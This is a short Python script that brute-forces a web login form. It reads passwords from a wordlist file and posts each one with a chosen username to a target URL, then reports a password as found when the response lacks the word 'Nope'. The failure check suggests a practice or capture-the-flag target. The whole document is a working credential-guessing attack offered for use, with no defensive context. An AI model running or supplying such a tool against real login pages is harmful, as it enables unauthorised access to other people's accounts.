import requests

url = input("Target Url: ")

username = input("What is the username you wish to attempt?: ")

password_file = input("Please enter the name of password file: ")

file = open(password_file, "r")

for password in file.readlines():
    password = password.strip("\n")
    
    data = {'username':username, 'password':password, "Login":'submit'}
    
    send_data_url = requests.post(url, data=data)
    if "Nope" in str(send_data_url.content):
        print("[*] Attempting password: %s" % password)
    else:
        print("[*] Password found: %s " % password)
        exit()
